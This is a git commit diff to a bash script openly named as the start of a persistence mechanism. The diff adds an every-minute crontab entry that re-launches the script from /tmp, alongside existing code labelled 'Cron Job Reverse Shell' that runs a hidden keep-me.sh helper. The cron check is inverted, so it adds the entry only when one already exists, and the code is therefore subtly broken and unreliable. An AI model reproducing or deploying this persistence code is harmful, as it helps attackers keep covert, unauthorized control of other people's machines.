6ae4379aa5c1c75187a685b57facd17ef595fa73
Graymos <142538040+Graymos@users.noreply.github.com>
2024-11-05 00:00:18 -0600

    Update totally-innocent-not-start-of-persistence.sh
    Cronjob to run itself

--- totally-innocent-not-start-of-persistence.sh
+++ totally-innocent-not-start-of-persistence.sh
@@ -1,7 +1,17 @@
 #!/bin/bash
 
+CRON_JOB="* * * * * /tmp/totally-innocent/totally-innocent-not-start-of-persistence.sh"
+
+# Check if the cron job already exists
+if crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
+    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+else
+    :
+fi
+
+
 #Cron Job Reverse Shell
-KEEP_ME_SCRIPT="/home/user/Documents/keep-me.sh"
+KEEP_ME_SCRIPT="$HOME/Documents/keep-me.sh"
 
 if [ -f "$KEEP_ME_SCRIPT" ]; then
     bash "$KEEP_ME_SCRIPT"
